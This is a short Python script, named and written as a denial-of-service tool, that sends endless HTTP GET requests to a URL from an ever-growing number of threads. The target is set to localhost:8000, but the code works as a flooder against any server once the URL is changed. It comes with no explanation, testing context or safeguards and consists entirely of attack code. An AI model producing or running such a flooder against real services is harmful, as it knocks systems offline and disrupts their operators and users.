import requests
import threading
import time

url="http://localhost:8000"

def send_request():
   while True:
       try:
          response=requests.get(url)
          print(f"Response code: {response.status_code}")
       except requests.exceptions.RequestException as e:
          print(f"Error: {e}")

def start_dos(threads,delay):
   while True:
       for _ in range(threads):
          thread=threading.Thread(target=send_request)
          thread.start()      
       time.sleep(delay)
       
start_dos(threads=5,delay=1)              
